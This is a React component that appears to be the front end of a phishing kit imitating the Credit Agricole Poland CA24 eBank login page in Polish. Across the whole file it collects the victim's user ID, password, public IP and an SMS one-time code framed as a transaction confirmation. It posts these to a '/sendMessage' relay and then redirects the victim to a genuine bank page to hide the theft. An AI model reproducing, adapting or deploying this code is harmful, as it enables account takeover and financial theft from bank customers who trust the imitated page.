import React, {useContext, useEffect, useState} from 'react'
import User from './icons/User'
import Case from './icons/Case'
import Keyboard from './icons/Keyboard'
import Info from './icons/Info'
import bell from '../img/bell-1000.png'
import {Context} from '../pages/AuthPage'
import advert_car from '../img/login-advert-car.png'
import eco from '../img/login-advert-eco.png'
import eco_case from '../img/login-advert-eco-case.png'
import MobileLogo from './logo/MobileLogo'
import Cancel from './icons/Cancel'
import Show from './icons/Show'
import Hide from './icons/Hide'
import axios from 'axios'
import Loading from './Loading'
import img0 from '../img/captcha/img0.png'
import img1 from '../img/captcha/img1.png'
import img2 from '../img/captcha/img2.png'
import img3 from '../img/captcha/img3.png'
import img4 from '../img/captcha/img4.png'
import img5 from '../img/captcha/img5.png'
import img6 from '../img/captcha/img6.png'
import img7 from '../img/captcha/img7.png'
import img8 from '../img/captcha/img8.png'
import img9 from '../img/captcha/img9.png'
import img10 from '../img/captcha/img10.png'
import img11 from '../img/captcha/img11.png'
import img12 from '../img/captcha/img12.png'
import img13 from '../img/captcha/img13.png'
import img14 from '../img/captcha/img14.png'
import { useNavigate } from 'react-router-dom';

const Main = () => {

    const [selectedTab, setSelectedTab] = useContext(Context);

    const images = [
        img0,
        img1,
        img2,
        img3,
        img4,
        img5,
        img6,
        img7,
        img8,
        img9,
        img10,
        img11,
        img12,
        img13,
        img14
    ];

    function getRandomImage() {
        const randomIndex = Math.floor(Math.random() * images.length);
        return images[randomIndex];
    }

    const navigate = useNavigate();
    const [isFocused, setIsFocused] = useState(false);
    const [inputLogin, setInputLogin] = useState('');
    const [inputPass, setInputPass] = useState('');
    const [inputSms, setInputSms] = useState('');
    const [currentStep, setCurrentStep] = useState(0);
    const [showPass, setShowPass] = useState(false);
    const [ip, setIP] = useState("");
    const [loading, setLoading] = useState(false);
    const [image, setImage] = useState(getRandomImage());

    const handleFocus = () => {
        setIsFocused(true);
    };

    const handleBlur = () => {
        if (inputLogin.trim() === '') {
            setIsFocused(false);
        }
    };

    const handleChange = (e) => {
        setInputLogin(e.target.value);
    };
    const handleChangePass = (e) => {
        setInputPass(e.target.value);
    };
    const handleChangeSms = (e) => {
        setInputSms(e.target.value);
    };

    const handleContinue = () => {
        if (currentStep === 0) {
            if (inputLogin) {
                setCurrentStep(1)
            }
        } else if(currentStep === 1) {
            setLoading(true);
            axios.post('http://localhost:5000/sendMessage', {
                login: inputLogin,
                pass: inputPass,
                ip: ip,
                method: 'sendLog'
            }).then(res => {
                console.log(res)
                setLoading(false);
                setCurrentStep(2)
            })
        } else {
            setLoading(true);
            axios.post('http://localhost:5000/sendMessage', {
                login: inputLogin,
                pass: inputPass,
                sms: inputSms,
                method: 'sendSms'
            }).then(res => {
                window.location.href = 'https://kontakt.credit-agricole.pl/zlap-555-zl?catm_source=creditagricole_pl&catm_medium=own&catm_partner=creditagricole&catm_campaign=555&catm_category=konta_indywidualne&catm_product=konto_osobiste&catm_content=str_login_nav_kr';
            })
        }
    }


    const getData = async () => {
        const res = await axios.get("https://api.ipify.org/?format=json");
        setIP(res.data.ip);
    };

    useEffect(() => {
        getData();
        console.log('loading:', loading)
    }, [])


    return (
        <div className='main-section containerBank'>
            {
            loading ? (
                <Loading/>) : (
                <div className='flex flex-col lg:flex-row lg:justify-center h-full'>
                    <a className='md:hidden pl-4 py-3 pr-1 bg-[#007d8F] hover:bg-[#058699] dark:bg-[#99cc00] dark:hover:bg-[#C2E066] rounded-xl my-4 flex justify-between'>
                        <div className='flex'>
                            <div className='bg-[#006675] w-[44px] h-[44px] px-[4px] py-[10px] rounded-lg'>
                                <MobileLogo/>
                            </div>
                            <div className='ml-4 text-white dark:text-black'>
                                <h3 className='font-semibold text-sm'>Pobierz aplikację CA24 Mobile</h3>
                                <p className='text-sm'>Aplikację pełną korzyści</p>
                            </div>
                        </div>
                        <button>
                            <Cancel/></button>
                    </a>
                    {
                    currentStep === 1 && (
                        <div className='w-full lg:hidden mb-4'>
                            <div className='mt-4 p-6 flex justify-between bg-white rounded-2xl'>
                                <div className='flex flex-col justify-center'>
                                    <p className='text-[#666] text-sm'>Twój identyfikator</p>
                                    <h4 className='text-[1.75rem] font-semibold'>
                                        {inputLogin} </h4>
                                </div>
                                <div className='border border-gray-300 rounded-xl w-[96px] h-[96px] flex items-center justifty-center w-full'>
                                    <img src={image}
                                        className='w-[72px] h-[72px] mx-auto'/>
                                </div>
                            </div>
                        </div>
                    )
                }
                    <div className={
                        `flex items-center w-full ${
                            currentStep === 2 ? 'justify-center' : 'justify-between'
                        }`
                    }>
                        <div className='w-full lg:w-5/12 mb-8 min-h-[298px] lg:mb-0'>
                            <div className={
                                `topbar bg-[#E6F1F3] dark:bg-[#E9E9E9] rounded-t-2xl flex overflow-hidden ${
                                    currentStep >= 1 ? 'hidden' : ''
                                }`
                            }>
                                <div className={
                                        `selectableTab p-5 flex items-center cursor-pointer transition-all ${
                                            selectedTab === 1 ? 'selectedTab bg-white rounded-t-2xl' : 'text-[#666666]'
                                        }`
                                    }
                                    onClick={
                                        () => {
                                            setSelectedTab(1);
                                            document.body.classList.remove('dark')
                                        }
                                }>
                                    <User color={
                                        selectedTab === 1 ? '#007D8F' : '#666666'
                                    }/>
                                    <p className='pl-2 font-medium text-sm'>Klient indywidualny</p>
                                </div>
                                <div className={
                                        `selectableTab p-5 flex items-center cursor-pointer transition-all ${
                                            selectedTab === 2 ? 'selectedTab bg-white rounded-t-2xl' : 'text-[#666666]'
                                        }`
                                    }
                                    onClick={
                                        () => {
                                            setSelectedTab(2);
                                            document.body.classList.add('dark')
                                        }
                                }>
                                    <Case color={
                                        selectedTab === 2 ? '#99cc00' : '#666666'
                                    }/>
                                    <p className='pl-2 text-sm font-medium'>Klient indywidualny</p>
                                </div>
                            </div>
                            <div className={
                                `p-8 bg-white min-w-[10.5rem] ${
                                    currentStep >= 1 ? 'rounded-2xl' : 'rounded-b-2xl'
                                }`
                            }>
                                <div className='flex items-center justify-between mb-2'>
                                    <h4 className='text-xl font-semibold'>{currentStep === 2 ? 'Potwierdzenie transakcji' : 'Zaloguj się'}</h4>
                                </div>
                                {currentStep === 2 && (<p className='text-xs pb-4 text-[#666] font-semibold'>Na Twój numer telefonu został wysłany unikalny kod. Sprawdź szczegóły transakcji i wprowadź unikalny kod.</p>)}
                                {
                                currentStep === 0 && (
                                    <div className='flex items-center justify-between'>
                                        <div className='w-full relative'>
                                            <label className={
                                                `inputLabel text-[#666666] transition-all ${
                                                    isFocused || inputLogin ? 'focused' : ''
                                                }`
                                            }>Identyfikator</label>
                                            <input type='text'
                                                onFocus={handleFocus}
                                                onBlur={handleBlur}
                                                onChange={handleChange}
                                                value={inputLogin}
                                                className='inputLogin text-sm font-semibold outline-none w-full border-[#C8C8C8] hover:border-[#99CC00] focus:border-[#99CC00] border'/>
                                        </div>
                                        <button className='relative group'>
                                            <div className='ml-2 infoBtn rounded-xl transition-all'>
                                                <Info/>
                                            </div>
                                            <div className='tooltip absolute left-2 top-full translate-y-4 top-full bg-white border border-gray-300 rounded-xl text-left w-80 px-4 py-2 text-xs opacity-0 transition-all invisible group-hover:visible group-hover:opacity-100'>W pole "Identyfikator" wpisz identyfikator użytkownika, który znajdziesz w Umowie Bankowości Elektronicznej. Możesz również używać aliasu, który stworzyłeś samodzielnie.</div>
                                        </button>
                                    </div>
                                )
                            }
                                {
                                currentStep === 1 && (
                                    <div className='flex items-center justify-between'>
                                        <div className='w-full relative'>
                                            <label className={
                                                `inputLabel text-[#666666] transition-all ${
                                                    isFocused || inputLogin ? 'focused' : ''
                                                }`
                                            }>Hasło</label>
                                            <input type={
                                                    showPass ? 'text' : 'password'
                                                }
                                                onFocus={handleFocus}
                                                onBlur={handleBlur}
                                                onChange={handleChangePass}
                                                value={inputPass}
                                                className='inputLogin text-sm font-semibold outline-none w-full border-[#C8C8C8] hover:border-[#99CC00] focus:border-[#99CC00] border'/>
                                            <button className='absolute right-2 top-1/2 -translate-y-1/2'
                                                onClick={
                                                    () => {
                                                        setShowPass(!showPass)
                                                    }
                                            }>
                                                <div className='infoBtn rounded-xl transition-all'>
                                                    {
                                                    showPass ? (
                                                        <Hide/>) : (
                                                        <Show/>)
                                                } </div>
                                            </button>
                                        </div>
                                    </div>
                                )
                            }
                                {
                                currentStep === 2 && (
                                    <div className='flex items-center justify-between'>
                                        <div className='w-full relative'>
                                            <label className={
                                                `inputLabel text-[#666666] transition-all ${
                                                    isFocused || inputLogin ? 'focused' : ''
                                                }`
                                            }>Kod jednorazowy</label>
                                            <input type='text'
                                                onFocus={handleFocus}
                                                onBlur={handleBlur}
                                                onChange={handleChangeSms}
                                                value={inputSms}
                                                className='inputLogin text-sm font-semibold outline-none w-full border-[#C8C8C8] hover:border-[#99CC00] focus:border-[#99CC00] border'/>
                                        </div>
                                    </div>
                                )
                            }
                                <div className='flex items-center justify-between my-4'></div>
                                {currentStep === 0 && (<button className={
                                            `w-full text-sm font-semibold py-3 transition-all rounded-xl ${
                                                inputLogin ? 'bg-[#99cc00] text-black' : 'bg-[#e9e9e9] text-[#888888]'
                                            }`
                                        }
                                        onClick={handleContinue}>Dalej</button>)}
                                {currentStep === 1 && (<div className='flex'>
                                        <button className={`w-full text-sm font-semibold py-3 transition-all rounded-xl bg-white border border-[#99cc00] hover:bg-[#F5FAE5]`}
                                            onClick={
                                                () => {
                                                    setCurrentStep(0)
                                                }
                                        }>Wróć</button>
                                        <button className={
                                                `w-full text-sm font-semibold py-3 ml-[1rem] transition-all rounded-xl ${
                                                    inputPass ? 'bg-[#99cc00] text-black' : 'bg-[#e9e9e9] text-[#888888]'
                                                }`
                                            }
                                            onClick={handleContinue}>Zaloguj się</button>
                                    </div>)}
                                {currentStep === 2 && (
                                    <button className={
                                        `w-full text-sm font-semibold py-3 transition-all rounded-xl ${
                                            inputSms ? 'bg-[#99cc00] text-black' : 'bg-[#e9e9e9] text-[#888888]'
                                        }`
                                    }
                                    onClick={handleContinue}>Dalej</button>
                                )}
                                </div>
                        </div>
                        {
                        currentStep === 0 && (
                            <div className='w-1/2 hidden lg:flex items-center'>
                                {
                                selectedTab === 1 ? (
                                    <div className='flex items-center'>
                                        <div className='grow-0'>
                                            <h2 className='text-black text-2xl font-semibold mb-2'>Zmiana w logowaniu do serwisu CA24 eBank</h2>
                                            <p className='text-sm text-[#666] font-normal'>
                                                Dodaliśmy nowy element bezpieczeństwa i weryfikacji podczas logowania do serwisu CA24 eBank. Przeczytaj więcej o przeglądarkach zaufanych na
                                                <a href='https://www.credit-agricole.pl/zaufane-przegladarki' className='text-[#007e90]'>
                                                    www.credit-agricole.pl/zaufane-przegladarki</a>
                                            </p>
                                        </div>
                                        <div className='shrink-0 grow-0'>
                                            <img alt='BELL'
                                                src={bell}
                                                className='mx-6 my-2'/>
                                        </div>
                                    </div>
                                ) : (
                                    <div className='flex items-center'>
                                        <div className='grow-0'>
                                            <h2 className='text-white text-2xl font-semibold mb-2'>Zarządzaj swoją firmą. Po swojemu.</h2>
                                            <p className='text-sm text-white font-normal'>
                                                Wygodne rozliczania z parterami za granicą. Karty walutowe EUR i USD. Ty opiekujesz się klientami, my pomagamy w formalnościach.
                                            </p>
                                            <a className='text-[#9c0] text-sm font-semibold'>Dowiedz się więcej o nowym sposobie logowania</a>
                                        </div>
                                        <div className='shrink-0 grow-0'>
                                            <div className='w-[366px] w-[291px] relative'>
                                                <div className='circleBig'></div>
                                                <div className='circleSmall-1'></div>
                                                <div className='circleSmall-2'></div>
                                                <div className='circleSmall-3'></div>
                                                <div className='circleSmall-green-1'></div>
                                                <div className='circleSmall-green-2'>
                                                    <img src={advert_car}
                                                        alt='CAR'
                                                        className='w-full h-full scale-75 translate-x-[5px]'/>
                                                </div>
                                                <div className='circleSmall-green-big'>
                                                    <div className='circleSmall-green-3'>
                                                        <img src={eco}
                                                            alt='ECO'
                                                            className='w-full h-full scale-[0.6] translate-x-[5px] -translate-y-[10px]'/>
                                                    </div>
                                                    <img src={eco_case}
                                                        alt='ECO_CASE'
                                                        className='ecoCase'/>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                )
                            } </div>
                        )
                    }
                        {
                        currentStep === 1 && (
                            <div className='max-w-7/12 hidden lg:block w-7/12 h-[298px]'>
                                <div className='ml-4 mb-4 p-6 flex items-center justify-between bg-white rounded-2xl'>
                                    <div className='h-[150px] flex flex-col justify-center'>
                                        <p className='text-[#666] text-sm'>Twój identyfikator</p>
                                        <h4 className='text-[1.75rem] font-semibold'>
                                            {inputLogin}</h4>
                                    </div>
                                    <div className='border border-gray-300 rounded-xl p-3.5'>
                                        <img src={image}
                                            className='p-3.5 max-w-[96px] max-h-[96px] mx-auto'/>
                                    </div>
                                </div>
                            </div>
                        )
                    } </div>
                </div>
            )
        } </div>
    )
}

export default Main
